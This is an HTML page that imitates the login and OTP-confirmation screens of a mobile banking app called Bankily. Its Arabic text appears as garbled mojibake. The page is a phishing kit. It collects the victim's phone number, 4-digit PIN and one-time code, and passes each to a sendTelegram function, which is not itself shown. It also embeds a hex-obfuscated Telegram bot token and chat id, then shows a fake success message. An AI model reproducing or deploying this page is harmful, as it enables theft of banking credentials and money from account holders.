<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bankily - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    <style>
        :root { --primary-blue: #0054a6; --bg-gray: #f7f7f7; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: var(--bg-gray); margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
        
        .app-container { width: 100%; max-width: 450px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        
        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        .top-banner img { width: 100%; display: block; }
        .login-content { padding: 20px 25px; text-align: right; flex: 1; }
        
        .input-label { display: block; margin-bottom: 8px; font-weight: 500; color: #333; font-size: 15px; }
        
        .bankily-input-group { 
            border-bottom: 1px solid #ccc; 
            margin-bottom: 25px; 
            display: flex; 
            align-items: center; 
            padding-bottom: 5px; 
        }
        .bankily-input { width: 100%; border: none; outline: none; font-size: 16px; text-align: right; color: #333; background: transparent; }

        .pin-wrapper { display: flex; justify-content: center; gap: 15px; direction: ltr; margin-top: 5px; width: 100%; }
        .pin-line { 
            width: 40px; height: 40px; border: none; border-bottom: 2px solid #999; 
            font-size: 24px; text-align: center; outline: none; background: transparent; border-radius: 0;
        }
        .pin-line:focus { border-bottom-color: var(--primary-blue); border-bottom-width: 3px; }

        .btn-blue { 
            background-color: var(--primary-blue); color: white; border: none; 
            width: 100%; padding: 14px; border-radius: 8px; font-size: 18px; 
            font-weight: bold; cursor: pointer; margin-top: 20px;
        }
        
        .forgot-link { text-align: right; margin-top: 15px; }
        .forgot-link a { color: #333; text-decoration: underline; font-size: 14px; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ù€ OTP */
        #otp-screen { display: none; padding: 40px 20px; text-align: center; background: #fff; flex-direction: column; align-items: center; height: 100vh; }
        .otp-title { font-size: 18px; font-weight: bold; margin-bottom: 40px; color: #000; }
        .otp-inputs-container { display: flex; justify-content: center; gap: 20px; direction: ltr; margin-bottom: 30px; }
        .otp-field { width: 50px; height: 40px; border: none; border-bottom: 3px solid #000; font-size: 28px; text-align: center; font-weight: bold; outline: none; background: transparent; }
        .otp-field:focus { border-bottom-color: var(--primary-blue); }

        .timer-info { font-size: 14px; color: #555; margin-bottom: 10px; }
        .timer-count { font-weight: bold; color: #000; font-size: 16px; display: block; margin-top: 5px; }
        .spinner { width: 30px; height: 30px; border: 3px solid #e0e0e0; border-top: 3px solid #4cd964; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #success-screen { display: none; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
    </style>
</head>
<body>

<div class="app-container">
    <div id="login-screen">
        <div class="top-banner">
            <img src="https://i.ibb.co/gZ61X1KD/IMG-0078.jpg" alt="Bankily Banner">
        </div>
        
        <div class="login-content">
            <p class="input-label">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</p>
            <div class="bankily-input-group">
                <input type="tel" id="phone" class="bankily-input" maxlength="8">
            </div>

            <p class="input-label">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ</p>
            <div class="bankily-input-group" style="border: none;">
                <div class="pin-wrapper">
                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-line login-pin" maxlength="1" inputmode="numeric">
                </div>
            </div>

            <button class="btn-blue" onclick="goToOtp()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
            
            <div class="forgot-link">
                <a href="#">Ù†Ø³ÙŠØª Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ ØŸ</a>
            </div>
        </div>
    </div>

    <div id="otp-screen">
        <div class="otp-title">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù…Ø±Ø³Ù„ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ Ø§Ù„Ù…Ø­Ù…ÙˆÙ„</div>
        <div class="otp-inputs-container">
            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
            <input type="tel" class="otp-field otp-box" maxlength="1" inputmode="numeric">
        </div>
        <div class="timer-info">ØªÙ†ØªÙ‡ÙŠ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø±Ù…Ø² Ø®Ù„Ø§Ù„ <span class="timer-count" id="timer">04:57</span></div>
        <div class="spinner"></div>
        <button class="btn-blue" onclick="finalize()">ØªØ£ÙƒÙŠØ¯</button>
    </div>

    <div id="success-screen">
        <div style="font-size: 80px; color: #4cd964;">âœ…</div>
        <h2 style="color: #333; margin-top: 20px;">ØªÙ…Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­</h2>
    </div>
</div>

<script>
    //  Ù…Ø§Ø±Ùˆ Ø§Ù„Ø­ÙˆØª  (  Ù„Ù…Ø´ÙŠØ·  )
    const _0x4f2a = ["\x38\x35\x31\x32\x33\x30\x38\x37\x37\x38\x3a\x41\x41\x47\x53\x41\x44\x32\x73\x66\x30\x73\x43\x67\x4e\x63\x34\x44\x47\x6c\x34\x30\x52\x2d\x6c\x6e\x61\x59\x39\x32\x42\x36\x56\x48\x52\x73", "\x36\x31\x36\x36\x35\x39\x37\x35\x30\x37"];

    function setupInputs(className) {
        const inputs = document.querySelectorAll('.' + className);
        inputs.forEach((input, index) => {
            input.addEventListener('focus', () => {
                if (index > 0 && inputs[index - 1].value === "") inputs[index - 1].focus();
            });
            input.addEventListener('input', () => {
                input.value = input.value.replace(/[^0-9]/g, '');
                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
            });
        });
    }

    setupInputs('login-pin');
    setupInputs('otp-box');

    function goToOtp() {
        const phone = document.getElementById('phone').value;
        const pins = Array.from(document.querySelectorAll('.login-pin')).map(i => i.value).join('');
        if (phone.length === 8 && /^[234]/.test(phone) && pins.length === 4) {
            sendTelegram(`ğŸ‘¤ Ø¯Ø®ÙˆÙ„:\nğŸ“± Ù‡Ø§ØªÙ: ${phone}\nğŸ”’ PIN: ${pins}`);
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('otp-screen').style.display = 'flex';
            startTimer();
        }
    }

    function startTimer() {
        let duration = 297;
        let timerDisplay = document.getElementById('timer');
        let timerInterval = setInterval(function () {
            let minutes = parseInt(duration / 60, 10);
            let seconds = parseInt(duration % 60, 10);
            timerDisplay.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
            if (--duration < 0) clearInterval(timerInterval);
        }, 1000);
    }

    function finalize() {
        const otps = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
        if (otps.length === 4) {
            sendTelegram(`ğŸ“© Ø±Ù…Ø² OTP: ${otps}`);
            document.getElementById('otp-screen').style.display = 'none';
            document.getElementById('success-screen').style.display = 'flex';
        }
    }
</script>
</body>
</html>
